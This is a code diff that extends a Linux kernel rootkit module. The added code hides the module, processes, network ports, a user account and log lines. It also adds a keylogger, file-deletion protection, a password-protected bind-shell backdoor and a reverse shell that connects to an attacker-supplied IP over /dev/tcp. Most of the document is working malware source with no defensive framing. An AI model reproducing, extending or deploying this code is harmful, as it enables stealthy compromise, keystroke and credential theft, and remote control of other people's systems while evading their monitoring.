@@ -45,19 +45,333 @@ struct ftrace_hook
     struct ftrace_ops ops;
 };
 
+static DEFINE_MUTEX(rk_mutex);
 typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);
 
 static orig_getdents64_t orig_getdents64;
-static struct ftrace_hook getdents_hook;
 static orig_read_t orig_read;
+
+static struct ftrace_hook getdents_hook;
 static struct ftrace_hook read_hook;
+static struct ftrace_hook tcp_seq_hook;
+static struct socket *backdoor_sock = NULL;
+
+/* === Multi-PID hiding === */
+static pid_t hidden_pids[MAX_HIDDEN_PIDS];
+static int hidden_pid_count = 0;
+static DEFINE_SPINLOCK(pid_lock);
+
+static int backdoor_port = 0;
 char rk_msg[RK_MSG_MAX];
-static pid_t pid_to_hide = 0;
+static char backdoor_password[BACKDOOR_PASS_MAX] = "2600";
+static struct task_struct *backdoor_thread = NULL;
+
+/* === Module list hiding === */
+static struct list_head *saved_module_list = NULL;
+static bool module_hidden = false;
+
+/* === Keylogger === */
+static char keylog_buf[KEYLOG_BUF_MAX];
+static int keylog_pos = 0;
+static bool keylog_enabled = false;
+static DEFINE_SPINLOCK(keylog_lock);
+
+
+/* === Rootkit active state (toggled via magic signal) === */
+static bool rk_active = true;
+
+/* === User hiding === */
+static char hidden_user[HIDDEN_USER_MAX] = "";
+
+/* === File protection === */
+static char protected_files[MAX_PROTECTED_FILES][PROTECTED_PATH_MAX];
+static int protected_file_count = 0;
+static DEFINE_SPINLOCK(protect_lock);
+
+static struct ftrace_hook unlink_hook;
+static struct ftrace_hook rename_hook;
+typedef asmlinkage long (*orig_unlinkat_t)(const struct pt_regs *);
+typedef asmlinkage long (*orig_renameat2_t)(const struct pt_regs *);
+static orig_unlinkat_t orig_unlinkat;
+static orig_renameat2_t orig_renameat2;
+
+/* === UDP hiding === */
+static struct ftrace_hook udp_seq_hook;
+
+/* Scancode to ASCII mapping (US QWERTY, lowercase only) */
+static const char *scancode_to_key[] = {
+    [1] = "[ESC]", [2] = "1", [3] = "2", [4] = "3", [5] = "4",
+    [6] = "5", [7] = "6", [8] = "7", [9] = "8", [10] = "9",
+    [11] = "0", [12] = "-", [13] = "=", [14] = "[BKSP]",
+    [15] = "[TAB]", [16] = "q", [17] = "w", [18] = "e", [19] = "r",
+    [20] = "t", [21] = "y", [22] = "u", [23] = "i", [24] = "o",
+    [25] = "p", [26] = "[", [27] = "]", [28] = "[ENT]",
+    [29] = "[CTRL]", [30] = "a", [31] = "s", [32] = "d", [33] = "f",
+    [34] = "g", [35] = "h", [36] = "j", [37] = "k", [38] = "l",
+    [39] = ";", [40] = "'", [41] = "`", [42] = "[LSHFT]", [43] = "\\",
+    [44] = "z", [45] = "x", [46] = "c", [47] = "v", [48] = "b",
+    [49] = "n", [50] = "m", [51] = ",", [52] = ".", [53] = "/",
+    [54] = "[RSHFT]", [55] = "*", [56] = "[ALT]", [57] = " ",
+};
+
+
+/* ============================================================
+ * Feature 1: Module list hiding — hide from lsmod/kobject
+ * ============================================================ */
+static void hide_module(void)
+{
+    if (module_hidden)
+        return;
+    saved_module_list = THIS_MODULE->list.prev;
+    list_del_init(&THIS_MODULE->list);
+    //kobject_del(&THIS_MODULE->mkobj.kobj);
+    module_hidden = true;
+    pr_info("rootkit: module hidden from lsmod\n");
+}
+
+static void show_module(void)
+{
+    if (!module_hidden)
+        return;
+    list_add(&THIS_MODULE->list, saved_module_list);
+    module_hidden = false;
+    pr_info("rootkit: module visible again in lsmod\n");
+}
+
+/* ============================================================
+ * Feature 3: Keylogger — input subsystem handler
+ * ============================================================ */
+static void keylog_event(struct input_handle *handle, unsigned int type,
+                         unsigned int code, int value)
+{
+    unsigned long flags;
+    const char *key;
+    size_t len;
+
+    if (!keylog_enabled || !rk_active)
+        return;
+    if (type != EV_KEY || value != 1) /* only key-down */
+        return;
+    if (code >= ARRAY_SIZE(scancode_to_key) || !scancode_to_key[code])
+        return;
+
+    key = scancode_to_key[code];
+    len = strlen(key);
+
+    spin_lock_irqsave(&keylog_lock, flags);
+    if (keylog_pos + len < KEYLOG_BUF_MAX - 1) {
+        memcpy(keylog_buf + keylog_pos, key, len);
+        keylog_pos += len;
+        keylog_buf[keylog_pos] = '\0';
+    }
+    spin_unlock_irqrestore(&keylog_lock, flags);
+}
+
+static int keylog_connect(struct input_handler *handler,
+                          struct input_dev *dev,
+                          const struct input_device_id *id)
+{
+    struct input_handle *handle;
+    int ret;
+
+    handle = kzalloc(sizeof(*handle), GFP_KERNEL);
+    if (!handle)
+        return -ENOMEM;
+
+    handle->dev = dev;
+    handle->handler = handler;
+    handle->name = "rk_keylog";
+
+    ret = input_register_handle(handle);
+    if (ret) {
+        kfree(handle);
+        return ret;
+    }
+
+    ret = input_open_device(handle);
+    if (ret) {
+        input_unregister_handle(handle);
+        kfree(handle);
+        return ret;
+    }
+
+    return 0;
+}
+
+static void keylog_disconnect(struct input_handle *handle)
+{
+    input_close_device(handle);
+    input_unregister_handle(handle);
+    kfree(handle);
+}
+
+static const struct input_device_id keylog_ids[] = {
+    { .driver_info = 1 },  /* matches all input devices */
+    { },
+};
+
+static struct input_handler keylog_handler = {
+    .event      = keylog_event,
+    .connect    = keylog_connect,
+    .disconnect = keylog_disconnect,
+    .name       = "rk_keylog",
+    .id_table   = keylog_ids,
+};
+
+/* ============================================================
+ * Feature: Multi-PID hiding helpers
+ * ============================================================ */
+static bool is_pid_hidden(pid_t pid)
+{
+    int i;
+    unsigned long flags;
+    bool found = false;
+
+    spin_lock_irqsave(&pid_lock, flags);
+    for (i = 0; i < hidden_pid_count; i++) {
+        if (hidden_pids[i] == pid) {
+            found = true;
+            break;
+        }
+    }
+    spin_unlock_irqrestore(&pid_lock, flags);
+    return found;
+}
+
+static int add_hidden_pid(pid_t pid)
+{
+    unsigned long flags;
+    int ret = 0;
+
+    spin_lock_irqsave(&pid_lock, flags);
+    if (hidden_pid_count >= MAX_HIDDEN_PIDS) {
+        ret = -ENOSPC;
+    } else {
+        hidden_pids[hidden_pid_count++] = pid;
+    }
+    spin_unlock_irqrestore(&pid_lock, flags);
+    return ret;
+}
+
+static int remove_hidden_pid(pid_t pid)
+{
+    unsigned long flags;
+    int i;
+
+    spin_lock_irqsave(&pid_lock, flags);
+    for (i = 0; i < hidden_pid_count; i++) {
+        if (hidden_pids[i] == pid) {
+            hidden_pids[i] = hidden_pids[--hidden_pid_count];
+            spin_unlock_irqrestore(&pid_lock, flags);
+            return 0;
+        }
+    }
+    spin_unlock_irqrestore(&pid_lock, flags);
+    return -ENOENT;
+}
+
+/* ============================================================
+ * Feature: File protection — hook unlinkat and renameat2
+ * ============================================================ */
+static bool is_file_protected(const char *path)
+{
+    int i;
+    unsigned long flags;
+
+    spin_lock_irqsave(&protect_lock, flags);
+    for (i = 0; i < protected_file_count; i++) {
+        if (strstr(path, protected_files[i]) != NULL) {
+            spin_unlock_irqrestore(&protect_lock, flags);
+            return true;
+        }
+    }
+    spin_unlock_irqrestore(&protect_lock, flags);
+    return false;
+}
+
+static asmlinkage long new_unlinkat(const struct pt_regs *regs)
+{
+    char __user *user_path = (char __user *)regs->si;
+    char kpath[PROTECTED_PATH_MAX] = {0};
+
+    if (rk_active && user_path) {
+        if (strncpy_from_user(kpath, user_path, sizeof(kpath) - 1) > 0) {
+            if (is_file_protected(kpath))
+                return -EACCES;
+        }
+    }
+    return orig_unlinkat(regs);
+}
+
+static asmlinkage long new_renameat2(const struct pt_regs *regs)
+{
+    char __user *user_path = (char __user *)regs->si;
+    char kpath[PROTECTED_PATH_MAX] = {0};
+
+    if (rk_active && user_path) {
+        if (strncpy_from_user(kpath, user_path, sizeof(kpath) - 1) > 0) {
+            if (is_file_protected(kpath))
+                return -EACCES;
+        }
+    }
+    return orig_renameat2(regs);
+}
+
+/* ============================================================
+ * Feature: UDP connection hiding — hook udp4_seq_show
+ * ============================================================ */
+static int new_udp4_seq_show(struct seq_file *seq, void *v)
+{
+    if (rk_active && v != SEQ_START_TOKEN) {
+        struct sock *sk = v;
+        if (sk->sk_num == (unsigned short)backdoor_port)
+            return 0;
+    }
+    return ((int (*)(struct seq_file *, void *))udp_seq_hook.original)(seq, v);
+}
+
+/* ============================================================
+ * Feature: Reverse shell — connect-back to attacker IP:PORT
+ * ============================================================ */
+static int reverse_shell_fn(void *data)
+{
+    char *target = (char *)data;
+    char ip[48] = {0};
+    char port_str[8] = {0};
+    char *colon;
+    char cmd[128];
+
+    colon = strchr(target, ':');
+    if (!colon || (colon - target) >= (int)sizeof(ip)) {
+        kfree(target);
+        return -EINVAL;
+    }
+
+    memcpy(ip, target, colon - target);
+    ip[colon - target] = '\0';
+    strscpy(port_str, colon + 1, sizeof(port_str));
+    kfree(target);
+
+    snprintf(cmd, sizeof(cmd),
+             "/bin/sh -i >& /dev/tcp/%s/%s 0>&1", ip, port_str);
+
+    {
+        char *argv[] = {"/bin/bash", "-c", cmd, NULL};
+        char *envp[] = {
+            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+            "HOME=/root",
+            NULL
+        };
+        call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    }
+
+    return 0;
+}
 
 /**
- * The function `new_getdents64` is a static hook for getdents64 that calls the original syscall, 
- * copies directory entries into kernel buffer, 
- * removes entries matching a module/script name or a hidden PID under /proc, 
+ * The function `new_getdents64` is a static hook for getdents64 that calls the original syscall,
+ * copies directory entries into kernel buffer,
+ * removes entries matching a module/script name or a hidden PID under /proc,
  * then writes back filtered results to user space and returns the new entry count
  *
  * @param regs The `regs` parameter in the `new_getdents64` function is a pointer to a structure of
@@ -71,6 +385,7 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
 {
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
     long ret = 0;
+    unsigned long uret = 0;
     struct linux_dirent64 *kbuf = NULL;
     struct linux_dirent64 *cur = NULL;
     unsigned long bpos = 0;
@@ -81,6 +396,9 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
     char *endptr = NULL;
 
     ret = orig_getdents64(regs);
+
+    if (!rk_active)
+        return ret;
     
     if (ret <= 0) {
         return ret;
@@ -93,6 +411,9 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
     path = d_path(&repertory->f_path, buffer, sizeof(buffer));
     fput(repertory);
 
+    if (IS_ERR(path)) {
+        return ret;
+    }
     kbuf = kzalloc(ret, GFP_KERNEL);
     
     if (!kbuf) {
@@ -104,25 +425,27 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
         kfree(kbuf);
         return -EFAULT;
     }
+    uret = (unsigned long)ret;
 
-    while (bpos < ret) {
+    while (bpos < uret) {
         cur = (struct linux_dirent64 *)((char *)kbuf + bpos);
         unsigned short reclen = cur->d_reclen;
         if (strcmp(cur->d_name, NAME_MODULE) == 0 || strcmp(cur->d_name, HIDDEN_SCRIPT) == 0) {
-            memmove(cur, (char *)cur + reclen, ret - bpos - reclen);
-            ret -= reclen;
+            memmove(cur, (char *)cur + reclen, uret - bpos - reclen);
+            uret -= reclen;
             continue;
         }
-        if (path != NULL && strcmp(path, "/proc") == 0 && pid_to_hide != 0) {
+        if (path != NULL && strcmp(path, "/proc") == 0 && hidden_pid_count > 0) {
             unsigned long pid = simple_strtoul(cur->d_name, &endptr, 10);
-            if (*endptr == '\0' && pid == pid_to_hide) {
-                memmove(cur, (char *)cur + reclen, ret - bpos - reclen);
-                ret -= reclen;
+            if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
+                memmove(cur, (char *)cur + reclen, uret - bpos - reclen);
+                uret -= reclen;
                 continue;
             }
         }
         bpos += cur->d_reclen;
     }
+    ret = (long)uret;
 
     if (copy_to_user(dirent, kbuf, ret)) {
         kfree(kbuf);
@@ -389,24 +712,28 @@ static void self_propagate(void)
 static asmlinkage long new_read(const struct pt_regs *regs)
 {
     char *end;
-
     long ret = 0;
-
     char buf[256];
-
     int fd = regs->di;
-    struct file *f = fget(fd);
+    struct file *filter = fget(fd);
 
-    if (!f)
+    if (!filter) {
         return ret;
+    }
 
-    char *path_fd = d_path(&f->f_path, buf, sizeof(buf));
-    fput(f);
+    char *path_fd = d_path(&filter->f_path, buf, sizeof(buf));
+    
+    fput(filter);
+
+    if (IS_ERR(path_fd)) {
+        return orig_read(regs);
+    }
+
+    if (!rk_active)
+        return orig_read(regs);
 
     if (strcmp(path_fd, "/tmp/.rk_cmd") == 0) {
-
         uid_t uid = current_uid().val;
-
         if (uid != 0 && uid != 1000)
             return ret;
 
@@ -422,13 +749,14 @@ static asmlinkage long new_read(const struct pt_regs *regs)
 
     ret = orig_read(regs);
 
-    if (ret <= 0)
+    if (ret <= 0 || ret > MAX_READ_INTERCEPT) {
         return ret;
+    }
 
     if (strcmp(path_fd, "/proc/modules") == 0) {
         char *kbuf;
 
-        kbuf = kzalloc(ret, GFP_KERNEL);
+        kbuf = kzalloc(ret + 1, GFP_KERNEL);
         
         if (!kbuf)
             return -ENOMEM;
@@ -437,7 +765,8 @@ static asmlinkage long new_read(const struct pt_regs *regs)
             kfree(kbuf);
             return -EFAULT;
         }
-
+        kbuf[ret] = '\0';
+        
         if (kbuf != NULL) {
             char *line = strstr(kbuf, NAME_MODULE);
 
@@ -469,7 +798,7 @@ static asmlinkage long new_read(const struct pt_regs *regs)
     if (strcmp(path_fd, "/etc/rc.local") == 0) {
         char *kbuf;
 
-        kbuf = kzalloc(ret, GFP_KERNEL);
+        kbuf = kzalloc(ret + 1, GFP_KERNEL);
         if (!kbuf)
             return -ENOMEM;
 
@@ -477,7 +806,7 @@ static asmlinkage long new_read(const struct pt_regs *regs)
             kfree(kbuf);
             return -EFAULT;
         }
-
+        kbuf[ret] = '\0';
         if (kbuf != NULL) {
             char *line = strstr(kbuf, "insmod");
 
@@ -505,8 +834,95 @@ static asmlinkage long new_read(const struct pt_regs *regs)
         kfree(kbuf);
     }
 
+    /* Feature: Hide user from /etc/passwd and /etc/shadow */
+    if (strlen(hidden_user) > 0 &&
+        (strcmp(path_fd, "/etc/passwd") == 0 ||
+         strcmp(path_fd, "/etc/shadow") == 0)) {
+        char *kbuf = kzalloc(ret + 1, GFP_KERNEL);
+        if (kbuf) {
+            if (!copy_from_user(kbuf, (void __user *)regs->si, ret)) {
+                kbuf[ret] = '\0';
+                char *line = kbuf;
+                char *dst = kbuf;
+                while (*line) {
+                    char *eol = strchr(line, '\n');
+                    size_t line_len = eol ? (size_t)(eol - line + 1) : strlen(line);
+                    bool hide = false;
+
+                    /* /etc/passwd and /etc/shadow lines start with username: */
+                    size_t ulen = strlen(hidden_user);
+                    if (line_len > ulen && memcmp(line, hidden_user, ulen) == 0
+                        && line[ulen] == ':') {
+                        hide = true;
+                    }
+
+                    if (!hide) {
+                        if (dst != line)
+                            memmove(dst, line, line_len);
+                        dst += line_len;
+                    }
+                    line += line_len;
+                }
+                *dst = '\0';
+                ret = dst - kbuf;
+                if (copy_to_user((void __user *)regs->si, kbuf, ret))
+                    ret = -EFAULT;
+            }
+            kfree(kbuf);
+        }
+    }
+
+    /* Feature 2: Filter rootkit entries from dmesg / syslog */
+    if (strstr(path_fd, "kmsg") != NULL ||
+        strcmp(path_fd, "/var/log/syslog") == 0 ||
+        strcmp(path_fd, "/var/log/kern.log") == 0) {
+        char *kbuf = kzalloc(ret + 1, GFP_KERNEL);
+        if (!kbuf)
+            return ret;
+
+        if (copy_from_user(kbuf, (void __user *)regs->si, ret)) {
+            kfree(kbuf);
+            return ret;
+        }
+        kbuf[ret] = '\0';
+
+        /* Remove any line containing "rootkit" */
+        char *line = kbuf;
+        char *dst = kbuf;
+        while (*line) {
+            char *eol = strchr(line, '\n');
+            size_t line_len = eol ? (size_t)(eol - line + 1) : strlen(line);
+
+            if (!strnstr(line, "rootkit", line_len)) {
+                if (dst != line)
+                    memmove(dst, line, line_len);
+                dst += line_len;
+            }
+            line += line_len;
+        }
+        *dst = '\0';
+        ret = dst - kbuf;
+
+        if (copy_to_user((void __user *)regs->si, kbuf, ret)) {
+            kfree(kbuf);
+            return -EFAULT;
+        }
+        kfree(kbuf);
+    }
+
     return ret;
 };
+
+static int new_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    if (rk_active && v != SEQ_START_TOKEN) {
+        struct sock *sk = v;
+        if (sk->sk_num == (unsigned short)backdoor_port)
+            return 0;
+    }
+    return ((int (*)(struct seq_file *, void *))tcp_seq_hook.original)(seq, v);
+}
+
 
 /**
  * The `hook_callback` function is a static function that modifies the instruction pointer in the
@@ -536,6 +952,224 @@ static void notrace hook_callback(unsigned long ip, unsigned long parent_ip, str
         regs->ip = (unsigned long)hook->function;
 }
 
+
+/**
+ * The function `install_read_hook` sets up a hook for the `__x64_sys_read` function using ftrace in
+ * the Linux kernel.
+ * 
+ * @param lookup The `lookup` parameter is a function pointer of type `kallsyms_lookup_name_t`. This
+ * function is used to look up the address of a symbol by name in the kernel symbol table. In the
+ * provided code snippet, it is being used to find the address of the symbol "__x64_sys
+ * 
+ * @return The function `install_read_hook` returns an integer value. If everything is successful, it
+ * returns 0. If there is an error during the installation process, it returns the corresponding error
+ * code.
+ */
+static int install_read_hook(kallsyms_lookup_name_t lookup)
+{
+    int ret;
+
+    read_hook.name = "__x64_sys_read";
+    read_hook.function = new_read;
+    read_hook.original = &orig_read;
+    
+    read_hook.address = lookup(read_hook.name);
+
+    if (!read_hook.address) {
+        pr_err("[-] Symbol not found: __x64_sys_read\n");
+        return -ENOENT;
+    }
+    pr_info("[+] %s @ 0x%lx\n", read_hook.name, read_hook.address);
+    
+    orig_read = (orig_read_t)read_hook.address;
+    
+    read_hook.ops.func = hook_callback;
+    read_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
+    
+    ret = ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 0, 0);
+    
+    if (ret) {
+        pr_err("[-] ftrace_set_filter_ip (read): %d\n", ret);
+        return ret;
+    }
+    
+    ret = register_ftrace_function(&read_hook.ops);
+    
+    if (ret) {
+        pr_err("[-] register_ftrace_function (read): %d\n", ret);
+        ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 1, 0);
+        read_hook.ops.func = NULL;
+        return ret;
+    }
+    
+    return 0;
+}
+
+/**
+ * The function `install_tcp_hook` sets up a hook on the `tcp4_seq_show` function for tracing and
+ * modification purposes.
+ * 
+ * @param lookup The `lookup` parameter in the `install_tcp_hook` function is a function pointer to a
+ * function that performs a symbol lookup in the kernel symbol table. This function is used to find the
+ * address of the symbol `tcp4_seq_show` which is needed for setting up a hook on the TCP sequence
+ * 
+ * @return The function `install_tcp_hook` returns an integer value. If the function completes
+ * successfully, it returns 0. If there are any errors during the installation of the TCP hook, it
+ * returns the corresponding error code.
+ */
+static int install_tcp_hook(kallsyms_lookup_name_t lookup)
+{
+    tcp_seq_hook.name = "tcp4_seq_show";
+    tcp_seq_hook.function = new_tcp4_seq_show;
+    tcp_seq_hook.original = NULL;
+    tcp_seq_hook.address = lookup(tcp_seq_hook.name);
+
+    if (!tcp_seq_hook.address) {
+        pr_err("[-] Symbol not found: tcp4_seq_show\n");
+        return -ENOENT;
+    }
+
+    pr_info("[+] tcp4_seq_show @ 0x%lx\n", tcp_seq_hook.address);
+    tcp_seq_hook.original = (void *)tcp_seq_hook.address;
+    
+    tcp_seq_hook.ops.func = hook_callback;
+    tcp_seq_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
+
+    int ret = ftrace_set_filter_ip(&tcp_seq_hook.ops, tcp_seq_hook.address, 0, 0);
+    if (ret) {
+        pr_err("[-] ftrace_set_filter_ip (tcp): %d\n", ret);
+        return ret;
+    }
+
+    ret = register_ftrace_function(&tcp_seq_hook.ops);
+    if (ret) {
+        pr_err("[-] register_ftrace_function (tcp): %d\n", ret);
+        ftrace_set_filter_ip(&tcp_seq_hook.ops, tcp_seq_hook.address, 1, 0);
+        tcp_seq_hook.ops.func = NULL;
+        return ret;
+    }
+    
+    return 0;
+}
+
+
+static int install_unlink_hook(kallsyms_lookup_name_t lookup)
+{
+    int ret;
+
+    unlink_hook.name = "__x64_sys_unlinkat";
+    unlink_hook.function = new_unlinkat;
+    unlink_hook.original = &orig_unlinkat;
+    unlink_hook.address = lookup(unlink_hook.name);
+
+    if (!unlink_hook.address) {
+        pr_err("[-] Symbol not found: __x64_sys_unlinkat\n");
+        return -ENOENT;
+    }
+    pr_info("[+] __x64_sys_unlinkat @ 0x%lx\n", unlink_hook.address);
+    orig_unlinkat = (orig_unlinkat_t)unlink_hook.address;
+
+    unlink_hook.ops.func = hook_callback;
+    unlink_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
+
+    ret = ftrace_set_filter_ip(&unlink_hook.ops, unlink_hook.address, 0, 0);
+    if (ret) return ret;
+
+    ret = register_ftrace_function(&unlink_hook.ops);
+    if (ret) {
+        ftrace_set_filter_ip(&unlink_hook.ops, unlink_hook.address, 1, 0);
+        unlink_hook.ops.func = NULL;
+        return ret;
+    }
+    return 0;
+}
+
+static void uninstall_unlink_hook(void)
+{
+    if (unlink_hook.ops.func)
+        unregister_ftrace_function(&unlink_hook.ops);
+    if (unlink_hook.address)
+        ftrace_set_filter_ip(&unlink_hook.ops, unlink_hook.address, 1, 0);
+}
+
+static int install_rename_hook(kallsyms_lookup_name_t lookup)
+{
+    int ret;
+
+    rename_hook.name = "__x64_sys_renameat2";
+    rename_hook.function = new_renameat2;
+    rename_hook.original = &orig_renameat2;
+    rename_hook.address = lookup(rename_hook.name);
+
+    if (!rename_hook.address) {
+        pr_err("[-] Symbol not found: __x64_sys_renameat2\n");
+        return -ENOENT;
+    }
+    pr_info("[+] __x64_sys_renameat2 @ 0x%lx\n", rename_hook.address);
+    orig_renameat2 = (orig_renameat2_t)rename_hook.address;
+
+    rename_hook.ops.func = hook_callback;
+    rename_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
+
+    ret = ftrace_set_filter_ip(&rename_hook.ops, rename_hook.address, 0, 0);
+    if (ret) return ret;
+
+    ret = register_ftrace_function(&rename_hook.ops);
+    if (ret) {
+        ftrace_set_filter_ip(&rename_hook.ops, rename_hook.address, 1, 0);
+        rename_hook.ops.func = NULL;
+        return ret;
+    }
+    return 0;
+}
+
+static void uninstall_rename_hook(void)
+{
+    if (rename_hook.ops.func)
+        unregister_ftrace_function(&rename_hook.ops);
+    if (rename_hook.address)
+        ftrace_set_filter_ip(&rename_hook.ops, rename_hook.address, 1, 0);
+}
+
+static int install_udp_hook(kallsyms_lookup_name_t lookup)
+{
+    int ret;
+
+    udp_seq_hook.name = "udp4_seq_show";
+    udp_seq_hook.function = new_udp4_seq_show;
+    udp_seq_hook.original = NULL;
+    udp_seq_hook.address = lookup(udp_seq_hook.name);
+
+    if (!udp_seq_hook.address) {
+        pr_err("[-] Symbol not found: udp4_seq_show\n");
+        return -ENOENT;
+    }
+    pr_info("[+] udp4_seq_show @ 0x%lx\n", udp_seq_hook.address);
+    udp_seq_hook.original = (void *)udp_seq_hook.address;
+
+    udp_seq_hook.ops.func = hook_callback;
+    udp_seq_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
+
+    ret = ftrace_set_filter_ip(&udp_seq_hook.ops, udp_seq_hook.address, 0, 0);
+    if (ret) return ret;
+
+    ret = register_ftrace_function(&udp_seq_hook.ops);
+    if (ret) {
+        ftrace_set_filter_ip(&udp_seq_hook.ops, udp_seq_hook.address, 1, 0);
+        udp_seq_hook.ops.func = NULL;
+        return ret;
+    }
+    return 0;
+}
+
+static void uninstall_udp_hook(void)
+{
+    if (udp_seq_hook.ops.func)
+        unregister_ftrace_function(&udp_seq_hook.ops);
+    if (udp_seq_hook.address)
+        ftrace_set_filter_ip(&udp_seq_hook.ops, udp_seq_hook.address, 1, 0);
+}
+
 /**
  * The function `install_hook` sets up a hook for the `__x64_sys_getdents64` system call using kprobes
  * and ftrace in the Linux kernel.
@@ -543,6 +1177,24 @@ static void notrace hook_callback(unsigned long ip, unsigned long parent_ip, str
  * @return The `install_hook` function returns an integer value. If the function executes successfully,
  * it returns 0. If there are any errors during the execution of the function, it returns the
  * corresponding error code.
+ */
+
+/**
+ * @brief   Registers new_read as an ftrace hook on __x64_sys_read.
+ *
+ * @details Resolves the address of __x64_sys_read via the lookup
+ *          pointer provided by install_hook(). Configures the
+ *          read_hook structure and registers it with ftrace to
+ *          intercept all sys_read calls system-wide.
+ *          Must be called from rootkit_init() after install_hook().
+ *
+ * @param   lookup  Pointer to kallsyms_lookup_name, provided by
+ *                  install_hook() after resolution via kprobe.
+ *
+ * @return  0 on success.
+ *          -ENOENT if __x64_sys_read symbol is not found.
+ *          Negative error code if ftrace_set_filter_ip or
+ *          register_ftrace_function fail.
  */
 static int install_hook(void)
 {
@@ -588,66 +1240,15 @@ static int install_hook(void)
     {
         pr_err("[-] register_ftrace_function: %d\n", ret);
         ftrace_set_filter_ip(&getdents_hook.ops, getdents_hook.address, 1, 0);
+        getdents_hook.ops.func = NULL;
         return ret;
     }
 
     install_read_hook(lookup);
-    return 0;
-}
-
-/**
- * @brief   Registers new_read as an ftrace hook on __x64_sys_read.
- *
- * @details Resolves the address of __x64_sys_read via the lookup
- *          pointer provided by install_hook(). Configures the
- *          read_hook structure and registers it with ftrace to
- *          intercept all sys_read calls system-wide.
- *          Must be called from rootkit_init() after install_hook().
- *
- * @param   lookup  Pointer to kallsyms_lookup_name, provided by
- *                  install_hook() after resolution via kprobe.
- *
- * @return  0 on success.
- *          -ENOENT if __x64_sys_read symbol is not found.
- *          Negative error code if ftrace_set_filter_ip or
- *          register_ftrace_function fail.
- */
-int install_read_hook(kallsyms_lookup_name_t lookup)
-{
-    int ret;
-
-    read_hook.name = "__x64_sys_read";
-    read_hook.function = new_read;
-    read_hook.original = &orig_read;
-
-    read_hook.address = lookup(read_hook.name);
-
-    if (!read_hook.address) {
-        pr_err("[-] Symbol not found: __x64_sys_read\n");
-        return -ENOENT;
-    }
-    pr_info("[+] %s @ 0x%lx\n", read_hook.name, read_hook.address);
-
-    orig_read = (orig_read_t)read_hook.address;
-
-    read_hook.ops.func = hook_callback;
-    read_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
-
-    ret = ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 0, 0);
-
-    if (ret) {
-        pr_err("[-] ftrace_set_filter_ip (read): %d\n", ret);
-        return ret;
-    }
-
-    ret = register_ftrace_function(&read_hook.ops);
-
-    if (ret) {
-        pr_err("[-] register_ftrace_function (read): %d\n", ret);
-        ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 1, 0);
-        return ret;
-    }
-
+    install_tcp_hook(lookup);
+    install_unlink_hook(lookup);
+    install_rename_hook(lookup);
+    install_udp_hook(lookup);
     return 0;
 }
 
@@ -665,7 +1266,7 @@ int install_read_hook(kallsyms_lookup_name_t lookup)
  * @warning Do not omit this call in rootkit_exit(). An ftrace hook
  *          not removed at module unload causes a kernel panic.
  */
-void uninstall_read_hook(void)
+static void uninstall_read_hook(void)
 {
     if (read_hook.ops.func != NULL) {
         int ret = unregister_ftrace_function(&read_hook.ops);
@@ -679,6 +1280,194 @@ void uninstall_read_hook(void)
             printk(KERN_ERR "rootkit: failed to clear ftrace filter (%d)\n", ret);
         }
     }
+}
+
+/**
+ * The function `uninstall_tcp_hook` is responsible for unregistering a ftrace function related to TCP
+ * and clearing the ftrace filter.
+ */
+static void uninstall_tcp_hook(void)
+{
+    if (tcp_seq_hook.ops.func != NULL) {
+        int ret = unregister_ftrace_function(&tcp_seq_hook.ops);
+        if (ret) {
+            printk(KERN_ERR "rootkit: failed to unregister ftrace function (tcp) (%d)\n", ret);
+        }
+    }
+    if (tcp_seq_hook.address != 0) {
+        int ret = ftrace_set_filter_ip(&tcp_seq_hook.ops, tcp_seq_hook.address, 1, 0);
+        if (ret) {
+            printk(KERN_ERR "rootkit: failed to clear ftrace filter (tcp) (%d)\n", ret);
+        }
+    }
+}
+
+/**
+ * The function `handle_backdoor_connection` accepts a connection, receives a message, and executes a
+ * shell if the received message matches a predefined password.
+ * 
+ * @return The function `handle_backdoor_connection` returns an integer value, which is 0 in this case.
+ */
+static int handle_backdoor_connection(void)
+{
+    struct socket *client_sock;
+    struct msghdr msg = {0};
+    char buf[32] = {0};
+    struct kvec vec = {.iov_base = buf, .iov_len = sizeof(buf) - 1};
+    int ret = 0;
+    int len = 0;
+
+    ret = kernel_accept(backdoor_sock, &client_sock, O_NONBLOCK);
+
+    if (ret == -EAGAIN)
+        return -EAGAIN;
+    if (ret < 0)
+        return ret;
+
+    len = kernel_recvmsg(client_sock, &msg, &vec, 1, sizeof(buf), 0);
+    if (len <= 0)
+        goto close_client;
+
+    if (strlen(backdoor_password) > 0 && strncmp(buf, backdoor_password,
+        strlen(backdoor_password)) == 0) {
+        char *argv[] = {"/bin/sh", NULL};
+        char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};
+        call_usermodehelper("/bin/sh", argv, envp, UMH_WAIT_EXEC);
+    }
+
+    close_client:
+        sock_release(client_sock);
+    return 0;
+}
+
+/**
+ * The function `backdoor_thread_fn` runs a loop to handle backdoor connections until the thread is
+ * stopped.
+ * 
+ * @param data In the provided code snippet, the `data` parameter is a void pointer that is passed to
+ * the `backdoor_thread_fn` function. This parameter can be used to pass any additional data or context
+ * information required by the thread function. In this case, it seems that the `data` parameter is
+ * 
+ * @return The function `backdoor_thread_fn` is returning an integer value of 0.
+ */
